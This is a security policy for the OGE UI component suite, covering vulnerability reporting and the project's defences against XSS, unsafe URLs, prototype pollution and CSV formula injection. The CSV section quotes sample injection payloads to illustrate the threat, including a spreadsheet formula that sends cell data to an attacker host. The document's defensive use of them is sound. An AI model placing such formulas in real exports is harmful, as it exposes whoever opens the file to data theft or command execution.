# Security Policy

## Supported versions

| Version | Status                                                        |
| ------- | ------------------------------------------------------------- |
| 1.x     | Supported — fixes land on the latest 1.x minor                |
| 0.13.x  | Security fixes only, until **2027-04-01**; then end of life   |
| < 0.13  | End of life — upgrade (migration notes are in `CHANGELOG.md`) |

Fixes are released as a patch of the latest minor; we do not back-port to
older minors of the same major.

## Reporting a vulnerability

Please **do not open a public issue** for security problems.

- Email **security@ogeui.com** with a description, affected package/version
  and reproduction steps, or
- use GitHub's private reporting: **Security → Report a vulnerability** on
  the [oge-ui/oge-ui](https://github.com/oge-ui/oge-ui) repository.

What happens next:

1. **Acknowledgement within 3 working days**, with a tracking reference.
2. **Triage within 10 working days**: we confirm (or explain why not), rate
   it with CVSS 4.0 and open a private GitHub Security Advisory (GHSA), to
   which you are invited as a collaborator.
3. **Fix target**: critical/high within 30 days, moderate/low within 90.
   The fix ships as a patch release; the GHSA is published with a CVE
   requested through GitHub at the same time, and the release notes link it.

We ask for a reasonable window (up to 90 days) before public disclosure;
credit is given in the advisory and the release notes unless you prefer
otherwise.

## How the suite handles untrusted data

Every component in this suite renders data the host application did not
write — rows from an API, menu items from a CMS, file names a user chose. The
rules below are what that data is allowed to do.

### Cell and node text is text

Row data reaches the DOM as text nodes and attributes, never as markup —
including search highlighting, which used to be the one exception. The kernel
(`buildSearchHighlightSegments`) returns the matched and unmatched **runs** of
the cell text, and each render layer emits real text nodes and `<mark>`
elements from them. No component calls `bypassSecurityTrustHtml` or
`dangerouslySetInnerHTML`.

That matters beyond correctness: the previous version escaped the text and
handed the result to a trusted-HTML API, which was safe but unusable in a
codebase that bans those APIs outright — and a grid whose cells show reported,
hostile content is exactly where such a ban exists. The sink is gone rather
than defended.

Two APIs deliberately accept markup, and say so at the call site:

- `OgeBpmnOverlay.html` — bound through Angular's sanitizing `[innerHTML]`;
  script tags and inline event handlers are stripped, but do not pass markup
  you would not put in your own template.
- Angular templates you supply for cells, items and columns are your code and
  are compiled as such.

The rich-text editor (`@oge-ui/editor`, `@oge-ui/react-editor`) is the one
component whose _value_ is markup. It never trusts it: the bound value, every
paste and drop, and `insertHtml()` go through one allowlist parser that turns
the markup into the editor's document model — allow-listed tags, `href`
(`sanitizeUrl`), `src` (`sanitizeResourceUrl`; no `blob:`, `file:` or SVG,
`data:image/*` only with `allowDataImages`), `alt`, `title`, `dir`, validated
`color` / `background-color` and `text-align` — and drops everything else,
`script`, `style`, `svg`, `iframe` and event handlers included. The value it
emits is re-serialized from that model with every text node and attribute
escaped, so a payload that only turns dangerous when the browser re-parses it
(mutation XSS) has nothing left to mutate. The editing surface is built with
`createElement` and the CSSOM — no `innerHTML`, no `dangerouslySetInnerHTML`.
`ogeSanitizeEditorHtml()` applies the same allowlist to HTML you render
elsewhere; still sanitize on the server, as you would any user-written HTML.

### URLs are sanitized in both render layers

Data-driven `url` fields (menu items, breadcrumbs, menubar items) can carry a
`javascript:` scheme. Angular's `[href]` binding neutralizes those through
`DomSanitizer`; React's `href={…}` does not, so the React layer routes every
data-driven `href`/`src` through `sanitizeUrl` / `sanitizeResourceUrl` from
`@oge-ui/behavior`. The check is an **allowlist**, the same shape as
Angular's: relative URLs and the `http`, `https`, `mailto`, `tel`, `ftp` and
`sms` schemes pass; every other scheme returns `about:blank`. `blob:` and
non-markup `data:` URLs pass only for resources (`sanitizeResourceUrl`, or
`allowObjectUrls: true`), and a custom protocol handler is opted into with
`allowedSchemes: ['web+app']` — script schemes such as `javascript:` can never
be allowed. Control characters and zero-width marks are stripped before the
scheme is read. Both functions are exported — use them if you render your own
links from the same data.

BPMN overlay badges keep only allow-listed elements and attributes (no
`role`), and a link that keeps `target` always gets `rel="noopener
noreferrer"` in both render layers.

### Exports cannot execute on open

`getCsv()` / `exportCsv()` (grid, tree list, pivot) and clipboard TSV prefix
with an apostrophe any cell whose **first non-whitespace character** is `=`,
`+`, `-`, `@` or one of their full-width forms (`＝` `＋` `－` `＠`), and any
cell that opens with a raw tab or CR, so a spreadsheet reads it as text rather
than a formula — CSV formula injection (CWE-1236), the `=cmd|…!A1` and
`=IMPORTXML("http://attacker/?"&A1)` class. Leading spaces do not hide a
formula: `"   =cmd"` is guarded too. The tree list guards the first-column
value before it adds its indentation, so the hierarchy padding cannot shift a
formula past the check. Plain numbers are exempt, so numeric columns stay
numeric. Pass
`formulaGuard: false` where the file is consumed by a parser rather than
opened in Excel or Sheets. The `.xlsx` exporters write typed cells, which
Excel never evaluates, so they need no guard.

PDF exports (grid, tree list, pivot, Gantt) embed only the TrueType font the
application hands them — `font` in the export options or the process-wide
`setOgePdfDefaultFont()` from `@oge-ui/behavior` — and fetch nothing on their
own. Serve that `.ttf` from your own origin (the docs site ships Noto Sans,
SIL OFL, under `public/fonts`); without one, jsPDF's built-in WinAnsi fonts
are used, which cannot draw text outside cp1252 — the export warns once in
the console when it meets such text.

### Restored state is validated, never trusted

A persisted grid, tree-list or pivot state comes back from `localStorage`, a
URL or a server — all places an attacker can write to. Every restore path
(`stateKey` persistence, `applyState()` in both render layers, the pivot
engine) runs the snapshot through `sanitizeGridStateSnapshot`,
`sanitizeTreeListStateSnapshot` or `sanitizePivotGridStateSnapshot` from
`@oge-ui/core`: unknown keys are dropped, `__proto__` / `constructor` /
`prototype` are rejected at any depth, every value is type-checked and
absurd nesting is refused. They never throw. `parseStateJson()` is the
matching `JSON.parse` replacement — it returns `undefined` for invalid JSON or
a prototype key — so restore your own stored state through the same pair.

### Uploads validate on the client only

`@oge-ui/upload` enforces `accept`, `allowedFileExtensions` and the size
bounds in the browser to give the user immediate feedback. That is a UX
control, not a security control: **re-validate type, size and content on the
server**. The uploader will happily send whatever your server accepts.

### Content Security Policy

The packages ship no inline scripts and evaluate no strings — no `eval`, no
`new Function`, no `document.write`. Inline styles are used for layout
(virtual-scroll offsets, panel positioning), so a strict policy needs
`style-src 'self' 'unsafe-inline'`. `script-src 'self'` is enough.

### Trusted Types

Under `require-trusted-types-for 'script'` the suite has two Trusted Types
sinks, both `DOMParser.parseFromString` into an inert document that is only
walked, never inserted. The rich-text editor (`@oge-ui/behavior`, used by
`@oge-ui/editor` and `@oge-ui/react-editor`) parses a value or a clipboard
payload behind a policy named **`oge-ui#editor`**. `@oge-ui/bpmn-engine` parses BPMN
XML on import and overlay badge markup for the React layer. Both documents are
inert (nothing in them runs or loads) and are only read, the overlay tree being
re-sanitized against the allowlist above. When `trustedTypes` exists the engine
creates, once and lazily, a policy named **`oge-ui#bpmn`** whose `createHTML`
passes its input through unchanged; list it in your policy directive:

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types oge-ui#bpmn oge-ui#editor
```

Angular apps also list Angular's own `angular` policy, which its sanitizing
`[innerHTML]` binding uses (the BPMN overlay badges in the Angular layer); the
suite never calls a `bypassSecurityTrust*` API, so `angular#unsafe-bypass` is
not needed.

This is tested, not just stated: the end-to-end suite serves the docs site
under a strict policy — nonce-only `script-src` with `'strict-dynamic'`,
nonce-only `<style>` elements, `require-trusted-types-for 'script'` and a
`trusted-types` list of Angular's policies plus the `oge-ui#…` names on this
page — and fails on any violation while it imports BPMN XML, renders an HTML
overlay badge, opens modals in both render layers and exports grids and
charts.

## Dependencies

Nothing in this workspace's `dependencies` or `devDependencies` is shipped to
consumers: the published packages declare Angular, React and the optional
export libraries as **peers**, and bundle nothing. A `npm audit` finding
against the repo is therefore a build-time issue for us, not an exposure for
you — CI fails the build on any advisory at moderate or above so it stays
that way. The one exception is an advisory with no patched release yet: it
is listed in `audit-allowlist.json` with its reason and an expiry date a few
weeks out, after which the build fails again until it is fixed
(`node tools/audit-check.mjs` is the gate). CI's third-party actions are
pinned to commit SHAs, and the repository is scored by OpenSSF Scorecard and
scanned by CodeQL.

`exceljs`, `jspdf` and `jspdf-autotable` are optional peers loaded only by the
`@oge-ui/*/export-excel` and `export-pdf` entry points. Advisories in those
libraries belong to their maintainers; reports about how OGE UI _uses_ them
are in scope here.

## Scope

In scope: XSS through any component's data path, formula/CSV injection in the
exporters, prototype pollution through state restore, and any way component
markup escapes the sanitizer.

Out of scope: vulnerabilities requiring the host application to pass attacker
controlled values to the APIs documented above as accepting markup; the
demo site's third-party analytics; and issues in peer dependencies.
